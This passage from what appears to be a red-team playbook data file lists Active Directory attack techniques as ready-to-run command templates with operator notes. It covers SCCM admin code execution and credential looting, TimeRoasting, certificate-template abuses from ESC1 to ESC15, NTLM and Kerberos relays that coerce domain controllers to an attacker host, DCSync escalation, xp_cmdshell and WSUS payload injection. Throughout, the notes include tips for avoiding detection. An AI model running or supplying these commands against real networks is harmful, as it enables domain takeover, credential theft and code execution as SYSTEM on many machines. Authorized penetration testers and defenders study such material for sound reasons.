cmd:"python3 sccmhunter.py admin -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ip {SCCM_IP}\nget_device {HOSTNAME}\ninteract <device_id>\nscript exploit.ps1",
failureIndicators:['No SCCM Full Administrator rights','Device not found in SCCM','Script approval required'],
notes:'With SCCM Full Administrator rights, you can run arbitrary PowerShell on any managed device as SYSTEM. sccmhunter admin mode provides an interactive shell — get_device lists managed devices, interact connects to one, script deploys a PS1. Cleanup: SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITE_CODE>. This is equivalent to lateral movement to every SCCM-managed machine in the environment — potentially thousands of endpoints. Common path: SCCM_008 relay gets MSSQL sysadmin, which grants SCCM admin via the database.'},
{id:'SCCM_011',phase:'credential-access',title:'SCCM HTTP Service Credential Loot',desc:'Loot credential files directly from SCCM HTTP Distribution Point without special tools',tool:'sccm-http-looter',os:'linux',noise:'low',auth:'required',
cmd:"sccm-http-looter -server {DP_IP} -u '{USERNAME}' -p '{PASSWORD}'\nnxc smb {DP_IP} -u {USERNAME} -p '{PASSWORD}' -M cmloot -o INVENTORY=sccmfiles.txt -o EXCLUDE_EXTS=exe,dll,msi",
failureIndicators:['HTTP/SMB DP not accessible','No packages found','Authentication denied'],
notes:'A targeted loot run against SCCM Distribution Points. Focus on script packages and application deployment sources — these frequently contain hardcoded service account credentials, database connection strings, and API keys. The -o EXCLUDE_EXTS flag skips large binary files to speed up enumeration. After downloading, search for: password, passwd, credentials, connectionString, SqlConnection in all .xml, .ini, .config, .ps1, .bat, .cmd files. Even one hardcoded password in a deployment script can escalate to domain admin.'},
{id:'NOCA_001',phase:'reconnaissance',title:'TimeRoasting (No Creds)',desc:'Extract machine account hashes via NTP without any credentials',tool:'timeroast',os:'linux',noise:'low',auth:'none',
cmd:"python3 timeroast.py {DC_IP} -o timeroast_hashes.txt\nhashcat -m 31300 timeroast_hashes.txt {WORDLIST}",
failureIndicators:['NTP port 123/UDP blocked','No vulnerable machine accounts','Hash format not supported'],
notes:'TimeRoasting requires zero credentials. It sends NTP requests to the DC and machine accounts respond with an HMAC-MD5 authenticator computed from their NT hash. Hash format is $sntp-ms$ — hashcat mode 31300. No rate limiting exists. Most useful in SCCM environments where many managed workstation accounts exist. A cracked machine account password reveals the NT hash, usable for Silver Tickets or lateral movement. Run nmap -sU -p 123 {DC_IP} first to confirm NTP is accessible. Machine account passwords are usually 120 random chars — focus on accounts added manually with simple passwords.'},
{id:'NOCA_002',phase:'reconnaissance',title:'ASREQRoasting (Passive Capture)',desc:'Passively capture AS-REQ Kerberos hashes from network traffic — no creds, no active requests',tool:'Pcredz',os:'linux',noise:'low',auth:'none',
cmd:"python3 Pcredz -i {INTERFACE} -v\npython3 Pcredz -f capture.pcap",
failureIndicators:['No Kerberos AS-REQ traffic observed','Pre-auth required on all accounts','Interface capture blocked'],
notes:'ASREQRoasting passively captures Kerberos AS-REQ packets from the network. When a user authenticates, the AS-REQ timestamp is encrypted with their NT hash. Pcredz extracts the hash ($krb5pa$23$ format) without sending any requests — completely passive, no detection risk. The captured hash is cracked with hashcat mode 18200 (same as AS-REP roasting). Works best on a segment with authentication traffic near a DC, or on a wifi segment. Combine with bettercap for passive position. This is the passive complement to active AS-REP roasting.'},
{id:'NOCA_003',phase:'reconnaissance',title:'DNS Zone Transfer (AXFR)',desc:'Request full DNS zone transfer to enumerate all hostnames without credentials',tool:'dig',os:'both',noise:'med',auth:'none',
cmd:"dig axfr {DOMAIN} @{DC_IP}\ndig axfr {DOMAIN} @{NAME_SERVER}\nhost -l {DOMAIN} {DC_IP}\nnmap --script dns-zone-transfer -p 53 {DC_IP}",
failureIndicators:['Zone transfer denied (REFUSED)','AXFR not allowed from this IP','No response on port 53'],
notes:'DNS zone transfer (AXFR) requests the complete DNS zone — every hostname, IP, MX record, SRV record. No credentials needed. Modern DCs usually deny zone transfers from unauthorized clients (REFUSED response). But misconfigured DNS servers, older infrastructure, or secondary DNS servers sometimes allow it. Even a partial enumeration is valuable: hostnames reveal server roles (mail, sql, dc, sccm, backup, jump), subnets reveal network layout. Also try: dig any {DOMAIN} @{DC_IP} for SOA and MX records. Success means you have a complete network map instantly.'},
{id:'NOCA_004',phase:'reconnaissance',title:'Anonymous LDAP and SMB Enumeration',desc:'Query LDAP and enumerate SMB shares without credentials using null sessions',tool:'ldapsearch/NetExec',os:'linux',noise:'low',auth:'none',
cmd:"ldapsearch -x -H ldap://{DC_IP} -s base\nnxc ldap {DC_IP} -u '' -p ''\nnxc smb {IP_RANGE} -u '' -p ''\nnxc smb {IP_RANGE} -u 'a' -p ''\nenum4linux-ng.py -a -u '' -p '' {DC_IP}",
failureIndicators:['Anonymous bind disabled','Null session rejected','LDAP port 389 filtered'],
notes:'Anonymous LDAP (null bind) is disabled by default in modern AD but still present in many environments. ldapsearch -x queries without credentials. The base query (-s base) returns the rootDSE — always succeeds and reveals: domain DN, domain functional level, forest name, and whether deeper anonymous queries are allowed. From the base DN you build all future LDAP queries. nxc with empty creds confirms null session availability. Also test SMB: nxc smb with empty or anonymous user often exposes share lists and user enumeration even when LDAP is locked. enum4linux-ng combines both checks.'},
{id:'ENUM_031',phase:'enumeration',title:'ldeep LDAP Full Enumeration',desc:'Comprehensive LDAP enumeration with ldeep — faster and more complete than most alternatives',tool:'ldeep',os:'linux',noise:'low',auth:'required',
cmd:"ldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} all {OUTPUT_DIR}\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} domain_policy\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} trusts\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} sccm\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} templates",
failureIndicators:['LDAP access denied','Authentication failure','ldeep not installed'],
notes:'ldeep is a comprehensive Python LDAP enumeration tool. The all command dumps everything to the output directory: users, groups, computers, GPOs, ACLs, trusts, ADCS, LAPS, GMSA, password policy, delegation — much faster than individual PowerView or ldapsearch commands. domain_policy shows fine-grained password policies AND the default policy. trusts maps all domain trusts. sccm specifically enumerates SCCM infrastructure. templates lists certificate templates. Install: pip3 install ldeep. Run all as first step after getting domain user creds, then analyze output offline.'},
{id:'ENUM_032',phase:'enumeration',title:'Password Policy Enumeration',desc:'Enumerate default and fine-grained password policies to plan password spray safely',tool:'NetExec/PowerView',os:'both',noise:'low',auth:'required',
cmd:"nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol\nldeep ldap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -s ldap://{DC_IP} domain_policy\nGet-ADDefaultDomainPasswordPolicy\nGet-ADFineGrainedPasswordPolicy -Filter *",
failureIndicators:['Insufficient rights to read PSO','SMB access denied','Command not found'],
notes:'Before password spraying, always enumerate the lockout policy to avoid locking accounts. Key values: lockout threshold (wrong attempts before lockout), lockout observation window (the reset period), and lockout duration. Fine-grained password policies (PSOs) may apply different — often LOWER — thresholds to privileged accounts. nxc --pass-pol shows the default policy. Fine-grained policies require LDAP enumeration. Rule: stay at least 1 attempt below the lockout threshold, wait the full observation window between spray batches, and NEVER exceed threshold for PSO-protected accounts.'},
{id:'ENUM_033',phase:'enumeration',title:'Enumerate ADCS Infrastructure',desc:'Find all certificate authorities, templates, and PKI misconfigurations in the domain',tool:'Certipy/Certify',os:'both',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -output adcs_output\ncertify.exe find /vulnerable\ncertutil -TCAInfo",
failureIndicators:['No ADCS deployed','LDAP access denied','PKI container not accessible'],
notes:'ADCS enumeration should be part of every initial enumeration pass — ADCS misconfigurations are present in roughly 90% of environments. certipy find (Linux) and certify.exe (Windows) analyze all templates and explicitly tag ESC1 through ESC15. The -vulnerable flag shows only templates with known issues; without it shows everything. certipy find generates a JSON plus text output — look for the VULNERABLE flags. certutil -TCAInfo confirms CA names. Pre-check: does ADCS exist? nmap -p 443 {DC_IP} looking for /certsrv/ in HTTP responses, or check for port 9389 (ADWS).'},
{id:'ENUM_034',phase:'enumeration',title:'SMB Share Spider (nxc)',desc:'Recursively spider all accessible SMB shares across the network to find sensitive files',tool:'NetExec',os:'linux',noise:'med',auth:'required',
cmd:"nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' --shares\nnxc smb {CIDR} -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} --shares\nnxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus -o DEPTH=3 EXCLUDE_EXTS=exe,dll,msi",
failureIndicators:['No readable shares','Access denied','Share enumeration blocked'],
notes:'After getting credentials, enumerate all SMB shares across the network. spider_plus recursively indexes all readable shares and saves a JSON inventory — no file downloads. Review output for: *.xml (config files with creds), *.ini, *.config, *.ps1, *.bat (scripts with hardcoded passwords), *.pfx (certificates), *.kdbx (KeePass), *.rdp (saved RDP creds), *.vbs. Focus on SYSVOL first (GPP passwords), then NETLOGON (logon scripts), then custom shares (IT, Backup, Scripts, Share). A single readable share often contains the next set of credentials.'},
{id:'XDOM_006',phase:'enumeration',title:'Foreign Group Members BloodHound Queries',desc:'Find groups and users with members from foreign domains via BloodHound Cypher',tool:'BloodHound',os:'both',noise:'low',auth:'required',
cmd:"MATCH p=(n:Group {domain:\"{DOMAIN_FQDN}\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p\nMATCH p=(n:User {domain:\"{DOMAIN_FQDN}\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p\nsharphound.exe -c all,trusts -d {DOMAIN}",
failureIndicators:['BloodHound data not collected with trust collection','No cross-domain members found','BloodHound CE not running'],
notes:'Run these BloodHound Cypher queries in the Custom Queries tab to find foreign principals (users or groups from another domain) that are members of groups in your target domain. Foreign principals in a domain only exist when there is a trust relationship. These accounts often have elevated rights and may have reused passwords. Cross-reference: MATCH (u:User)-[:GenericAll|GenericWrite|WriteDACL|WriteOwner]->(c) WHERE u.domain<>c.domain RETURN u,c. Collect BloodHound with trusts: sharphound.exe -c all,trusts -d {DOMAIN} to include trust relationship edges.'},
{id:'XDOM_007',phase:'enumeration',title:'Map All Domain Trusts',desc:'Enumerate complete trust topology across the forest using multiple methods',tool:'PowerView/nltest',os:'both',noise:'low',auth:'required',
cmd:"nltest.exe /trusted_domains\nGet-DomainTrust -Domain {DOMAIN}\nGet-DomainTrustMapping\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\nMATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
failureIndicators:['No trusts configured','PowerView not loaded','BloodHound data lacks trust edges'],
notes:'Trust mapping is essential before attempting cross-domain attacks. nltest gives a quick list. PowerView Get-DomainTrustMapping recursively maps all trusts. The BloodHound Cypher query shows the visual trust graph. Key attributes per trust: direction (A to B, B to A, or bidirectional), type (FOREST_TRANSITIVE vs TREAT_AS_EXTERNAL vs WITHIN_FOREST), and SID filtering status. SID filtering removes the ExtraSIDs attack path — if enabled, cross-domain escalation via golden ticket with extra SIDs will not work. TREAT_AS_EXTERNAL trusts have weaker security and allow SID history. Map all trusts before planning your cross-domain attack path.'},
{id:'XDOM_008',phase:'enumeration',title:'Cross-Domain ACL Enumeration',desc:'Find ACL entries that grant rights to foreign domain principals',tool:'PowerView',os:'windows',noise:'low',auth:'required',
cmd:"Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceDomain -ne '{DOMAIN}' }\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match '{FOREIGN_DOMAIN_SID}'}",
failureIndicators:['No cross-domain ACEs found','PowerView not loaded','Access denied on ACL enumeration'],
notes:'Foreign principals in ACLs are a frequently overlooked attack path. A user in DomainB may have GenericAll or WriteDACL on a high-value object in DomainA — placed intentionally for admin delegation or accidentally during migrations. Find-InterestingDomainAcl with IdentityReferenceDomain filtering shows only foreign-domain ACEs. Cross-reference with BloodHound: MATCH (u:User)-[:GenericAll|GenericWrite|WriteDACL|WriteOwner]->(c) WHERE u.domain<>c.domain RETURN u,c. These are direct paths to privilege escalation via ACL abuse across the trust boundary.'},
{id:'ESC_007',phase:'credential-access',title:'Certipy ESC1 (Attacker-Supplied SAN)',desc:'Request a cert with attacker-controlled Subject Alternative Name to impersonate any user',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME} -upn administrator@{DOMAIN}\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}",
failureIndicators:['CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT not set','Enrollment rights denied','Template not found'],
notes:'ESC1 is the most common and impactful ADCS misconfiguration. Two conditions must both be true: (1) the template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled, allowing the requester to specify the SAN, and (2) the template grants enrollment rights to low-privilege users. certipy find -vulnerable labels affected templates [ESC1]. The -upn flag specifies whose identity to embed in the SAN. After certipy auth you get the NTLM hash of that user. ESC1 directly yields Domain Admin if the administrator UPN is used. Check: does the template show Allows requester to supply subject? That is ESC1.'},
{id:'ESC_008',phase:'credential-access',title:'Certipy ESC4 (Write on Certificate Template)',desc:'Overwrite a certificate template configuration to introduce ESC1 exploitability',tool:'Certipy',os:'linux',noise:'med',auth:'required',
cmd:"certipy template -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -template {TEMPLATE_NAME} -save-old\ncertipy template -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -template {TEMPLATE_NAME} -configuration modified.json\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME} -upn administrator@{DOMAIN}\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}\ncertipy template -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -template {TEMPLATE_NAME} -configuration old.json",
failureIndicators:['Write permission denied on template','CA enrollment denied','Restore failed'],
notes:'ESC4: You have WriteDACL, WriteOwner, WriteProperty, or GenericWrite on a certificate template AD object. Use this to modify the template to enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, making it ESC1-exploitable. The -save-old flag backs up the original config so you can restore after exploitation. Steps: (1) Save original, (2) Modify to add ESC1 conditions, (3) Request malicious cert, (4) Auth, (5) RESTORE original immediately. Restoration is critical — leaving modified state will be detected and breaks legitimate users of the template.'},
{id:'ESC_009',phase:'credential-access',title:'Certipy ESC5 (Vulnerable PKI Object ACL)',desc:'Exploit write access on CA or PKI container objects to escalate to CA admin',tool:'Certipy',os:'linux',noise:'med',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy ca -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -add-officer {USERNAME}\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template SubCA -upn administrator@{DOMAIN}",
failureIndicators:['No write access on PKI objects','CA unreachable','Officer rights insufficient'],
notes:'ESC5: Writable access on sensitive PKI AD objects OTHER than templates — the CA server computer object, the PKI container itself (CN=Public Key Services), or the NTAuthCertificates object. If you can write to these, you can add yourself as CA Manager, install your own root CA cert, or modify which certificates are trusted for smart-card logon. certipy find reports [ESC5] when such misconfigured objects exist. The attack chain is similar to ESC7 but the entry point is different PKI objects. Very high impact if found.'},
{id:'ESC_010',phase:'credential-access',title:'Certipy ESC6 (CA-Level SAN Override Flag)',desc:'Exploit CA flag that allows SAN override on ANY template enrolled by any user',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template User -upn administrator@{DOMAIN}\ncertipy auth -pfx administrator.pfx -dc-ip {DC_IP}",
failureIndicators:['EDITF_ATTRIBUTESUBJECTALTNAME2 not set','Enrollment denied on User template'],
notes:'ESC6: The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled at the CA level — not on a specific template. This makes EVERY template that allows enrollment effectively ESC1-exploitable. Unlike ESC1 which requires a specific misconfigured template, ESC6 means ANY template including the built-in User template (enrollable by all domain users) accepts attacker-supplied SANs. certipy find shows CA allows user specified SAN under the CA entry. Very impactful — no need to find a specific vulnerable template, just use the default User template.'},
{id:'ESC_011',phase:'credential-access',title:'Certipy ESC8 (NTLM Relay to Web Enrollment)',desc:'Relay a coerced machine auth to ADCS HTTP enrollment to get a cert for that machine',tool:'Certipy',os:'linux',noise:'high',auth:'required',
cmd:"certipy relay -target http://{CA_IP}/certsrv/certfnsh.asp -template DomainController\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {DC_IP}",
failureIndicators:['Web enrollment not enabled','HTTPS with channel binding blocks relay','No coerce target available'],
notes:'ESC8: The ADCS web enrollment interface at http://{CA_IP}/certsrv does not enforce HTTPS or channel binding, allowing NTLM relay. Coerce a DC to authenticate to your relay listener. certipy relay forwards this auth to web enrollment, requests a DomainController template cert on behalf of the DC. Then use certipy auth with the DC cert to obtain the DC machine account NTLM hash — enabling DCSync. Pre-check: curl -I http://{CA_IP}/certsrv/ should return 401 prompting for NTLM auth. Run certipy relay first, then coerce.'},
{id:'ESC_012',phase:'credential-access',title:'Certipy ESC11 (RPC Enrollment Relay)',desc:'Relay to ADCS RPC enrollment interface (MS-ICPR) instead of HTTP web enrollment',tool:'Certipy',os:'linux',noise:'high',auth:'required',
cmd:"certipy relay -target rpc://{CA_IP} -ca {CA_NAME} -template DomainController\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {DC_IP}",
failureIndicators:['RPC endpoint unreachable','StrongCertificateBindingEnforcement blocks it','CA requires HTTPS'],
notes:'ESC11: Like ESC8 but uses the MS-ICPR RPC interface instead of HTTP web enrollment. Useful when web enrollment is disabled or protected but the raw RPC interface on port 135 is accessible. certipy relay with -target rpc:// uses ICertPassage instead of HTTP. Same attack chain: coerce DC to authenticate to relay, get DC certificate, certipy auth, DC NTLM hash, DCSync. Verify: rpcdump {CA_IP} | grep -i cert or check if port 445 + 135 are open and web enrollment returns 404.'},
{id:'ESC_013',phase:'credential-access',title:'Certipy ESC13 (OID-Linked Group Membership)',desc:'Abuse a cert template linked via OID to a high-privilege Universal Group',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME}\ncertipy auth -pfx {USERNAME}.pfx -dc-ip {DC_IP}",
failureIndicators:['No OID-linked group found','Group not high-value','Template not ESC13-flagged'],
notes:'ESC13: A certificate template has an Issuance Policy OID linked to a Universal Group in AD via msDS-OIDToGroupLink. When you authenticate with a cert from this template, Windows adds you to that Universal Group for the authentication session. If the OID-linked group is Domain Admins or a tier-0 group, this grants temporary DA rights per session. certipy find -vulnerable reports [ESC13]. The group membership is transient — each new authentication re-asserts it via the Kerberos PAC.'},
{id:'ESC_014',phase:'credential-access',title:'Certipy ESC14 (Explicit Certificate Mapping)',desc:'Abuse explicit X509 cert mapping on AltSecurityIdentities to impersonate high-priv users',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn {ATTACKER_UPN}\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME}\ncertipy auth -pfx {USERNAME}.pfx -dc-ip {DC_IP}\ncertipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn {ORIGINAL_UPN}",
failureIndicators:['AltSecurityIdentities write required','StrongCertificateBindingEnforcement = 2','Write on user object denied'],
notes:'ESC14: Exploits the X509IssuerSerialNumber mapping in AltSecurityIdentities. If you can write the AltSecurityIdentities attribute on a user (via GenericWrite or WriteDACL), set it to match an attacker-controlled certificate, then authenticate with that cert as the target user. Bypasses UPN-based certificate mapping and is relevant when StrongCertificateBindingEnforcement is enforced (value = 2). The attack window is while AltSecurityIdentities is modified — restore immediately after obtaining the ticket to avoid detection.'},
{id:'ESC_015',phase:'credential-access',title:'Certipy ESC15 (Schema V1 Application Policy)',desc:'Abuse schema version 1 templates where Application Policy OID controls authentication',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME} -application-policies 1.3.6.1.5.5.7.3.2",
failureIndicators:['Schema V2 template','Application Policy not controllable by requester','Enrollment denied'],
notes:'ESC15: Schema version 1 certificate templates do not have a proper EKU field — instead they use Application Policies. If a schema V1 template allows the requester to specify application policies, an attacker can request a cert with the Client Authentication OID (1.3.6.1.5.5.7.3.2) embedded, enabling Kerberos authentication with that cert. certipy find reports [ESC15]. Less common than ESC1 but found in environments with legacy templates from Windows 2000 or 2003 era that were never migrated to schema version 2.'},
{id:'RELAY_001',phase:'credential-access',title:'ntlmrelayx SMB to LDAP (Escalate User)',desc:'Relay SMB auth to LDAP to grant DCSync rights to a controlled user',tool:'ntlmrelayx',os:'linux',noise:'high',auth:'required',
cmd:"nxc smb {CIDR} --gen-relay-list unsigned.txt\nimpacket-ntlmrelayx -t ldap://{DC_IP} -smb2support --escalate-user {USERNAME}\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {TARGET_IP}",
failureIndicators:['LDAP signing enforced','SMB signing required on source','Target already has DCSync'],
notes:'The most impactful NTLM relay path. Relay any SMB auth (from coercion, Responder, or organic traffic) to LDAP on the DC. --escalate-user grants DCSync rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) to {USERNAME}. Pre-checks: (1) Is SMB signing disabled on source? nxc smb {CIDR} --gen-relay-list unsigned.txt — (2) Is LDAP signing enforced? ldap-checker {DC_IP}. Run ntlmrelayx first, then trigger auth via coercion or Responder. After escalation run: impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} to dump all hashes.'},
{id:'RELAY_002',phase:'credential-access',title:'ntlmrelayx HTTP to LDAP (WebDAV Path)',desc:'Relay WebDAV-coerced HTTP auth to LDAP — bypasses LDAP signing enforcement',tool:'ntlmrelayx/Responder',os:'linux',noise:'high',auth:'required',
cmd:"# Disable SMB+HTTP in Responder: edit /etc/responder/Responder.conf SMB=Off HTTP=Off\nresponder -I {INTERFACE}\nimpacket-ntlmrelayx -t ldaps://{DC_IP} -smb2support --escalate-user {USERNAME}\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {TARGET_IP} --webdav",
failureIndicators:['LDAPS channel binding enforced','WebDAV client not running on target','No WebDAV coerce available'],
notes:'HTTP to LDAP relay bypasses the LDAP signing enforcement that blocks SMB to LDAP. WebDAV coercion sends HTTP auth (not SMB), and HTTP to LDAP relay is not blocked by SMB signing policy. Critical: disable SMB and HTTP in Responder.conf first to prevent Responder from capturing and corrupting the auth. Run ntlmrelayx pointing to LDAPS, then trigger WebDAV coerce. WebDAV requires the WebClient service running on the target — common on workstations, can be enabled via the .searchConnector-ms trick (see COERCE_004). Also effective: drop a .url file on a writable share pointing to attacker port 80.'},
{id:'RELAY_003',phase:'lateral-movement',title:'ntlmrelayx SMB to SMB (SOCKS)',desc:'Relay SMB auth to another host to get an interactive SOCKS5 proxy session',tool:'ntlmrelayx',os:'linux',noise:'high',auth:'required',
cmd:"nxc smb {CIDR} --gen-relay-list unsigned.txt\nimpacket-ntlmrelayx -tf unsigned.txt -smb2support -socks\n# After relay entry appears:\nproxychains impacket-smbclient -no-pass {DOMAIN}/{USERNAME}@{TARGET_IP}\nproxychains impacket-secretsdump -no-pass '{DOMAIN}/{USERNAME}'@'{TARGET_IP}'",
failureIndicators:['SMB signing required on ALL targets','No successful relays','SOCKS proxy not starting'],
notes:'Instead of a one-shot exploit, -socks keeps the relayed session alive as a SOCKS5 proxy. You get a session entry like: SOCKS: Adding {DOMAIN}/{USERNAME}@{TARGET_IP}(445). Use proxychains with any impacket tool and -no-pass to reuse that session. Browse shares, run secretsdump, or run any SMB command AS the relayed user without their password. The session lives as long as ntlmrelayx runs. Build unsigned.txt with: nxc smb {CIDR} --gen-relay-list unsigned.txt. Check the socks command in ntlmrelayx for the session table.'},
{id:'RELAY_004',phase:'lateral-movement',title:'ntlmrelayx SMB to MSSQL',desc:'Relay SMB auth to MSSQL to execute SQL commands as the relayed user',tool:'ntlmrelayx',os:'linux',noise:'high',auth:'required',
cmd:"impacket-ntlmrelayx -smb2support -ts -t mssql://{MSSQL_IP} -q \"SELECT SYSTEM_USER; EXEC master..xp_cmdshell 'whoami'\"",
failureIndicators:['MSSQL not reachable','Relayed user has no SQL access','xp_cmdshell disabled'],
notes:'If the relayed user (machine account or domain user) has SQL access or sysadmin rights on a MSSQL instance, relay directly to it. The -q flag executes a SQL query in the relay. Start with SELECT SYSTEM_USER to confirm the login level, then EXEC master..xp_cmdshell. Machine accounts of servers often have sysadmin rights on their local SQL instance. Particularly powerful when coercing a server that runs MSSQL (its machine account is often sysadmin on its own SQL). Also works for SCCM MSSQL relay — see SCCM_008.'},
{id:'RELAY_005',phase:'privilege-escalation',title:'Certipy Relay to CA Web Enrollment (ESC8)',desc:'Relay coerced DC auth to ADCS web enrollment to obtain a DC certificate',tool:'Certipy',os:'linux',noise:'high',auth:'required',
cmd:"certipy relay -target http://{CA_IP} -template DomainController\npython3 coercer.py coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {DC_IP}",
failureIndicators:['Web enrollment requires HTTPS','Channel binding enforced','Template DomainController not enrollable'],
notes:'This is the ESC8 relay attack — see ESC_011 for full details. Run certipy relay (not ntlmrelayx) because it handles the ADCS enrollment protocol. The DC machine account cert lets you do PKINIT as the DC, get its NTLM hash via UnPAC-the-hash, then DCSync. The CA web enrollment must be running HTTP (not HTTPS) or HTTPS without channel binding. Pre-check: curl -v http://{CA_IP}/certsrv/ should prompt for auth. Run certipy relay first, then coerce. The cert file is saved automatically after successful relay.'},
{id:'RELAY_006',phase:'credential-access',title:'ntlmrelayx to WSUS',desc:'Relay to WSUS update server to inject a malicious update and get SYSTEM on target',tool:'ntlmrelayx',os:'linux',noise:'high',auth:'required',
cmd:"impacket-ntlmrelayx -smb2support -ts -t http://{WSUS_IP}:8530/iuident.cab\n# Check WSUS server: nmap -p 8530,8531 {WSUS_IP}",
failureIndicators:['WSUS uses HTTPS (8531)','No coerceable targets','WSUS not reachable','Relay signature check'],
notes:'WSUS servers running HTTP on port 8530 (not HTTPS on 8531) can receive NTLM-relayed requests. Relay a machine account auth to WSUS to approve a fake update that runs a payload as SYSTEM on the target machine when it next checks for updates. Requires: WSUS running HTTP, target machine using this WSUS server (check registry: HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\WUServer). Very high impact — SYSTEM on every machine using that WSUS. Check: nmap -p 8530,8531 {WSUS_IP}.'},
{id:'RELAY_007',phase:'credential-access',title:'Kerberos Relay (krbrelayx)',desc:'Relay Kerberos authentication — works when NTLM is disabled or Kerberos-only policies enforced',tool:'krbrelayx',os:'linux',noise:'high',auth:'required',
cmd:"python3 krbrelayx.py --target ldap://{DC_IP} --victim {DC_NAME}$\npython3 addspn.py -u '{DOMAIN}/{USERNAME}' -p '{PASSWORD}' -s 'HOST/{ATTACKER_FQDN}' -t '{UNCONSTRAINED_HOST}$' --additional",
failureIndicators:['Target has no unconstrained delegation','Kerberos signing/sealing enforced','SPN conflict'],
notes:'Kerberos relay requires a machine with unconstrained delegation as the relay source — the machine sends its TGT embedded in service tickets. krbrelayx.py is the Kerberos equivalent of ntlmrelayx. Attack: add a SPN on the unconstrained delegation machine pointing to your attacker host, coerce the machine to send a service ticket to you, krbrelayx extracts the embedded TGT and forwards it to LDAP or another service. Useful in environments with NTLM disabled or Kerberos-only authentication policies. See github.com/dirkjanm/krbrelayx for full documentation.'},
{id:'RELAY_008',phase:'credential-access',title:'NTLMv1 Relay with Fixed Challenge',desc:'Capture NTLMv1 hashes with fixed challenge for instant NT hash extraction via crack.sh',tool:'Responder/ntlmrelayx',os:'linux',noise:'med',auth:'none',
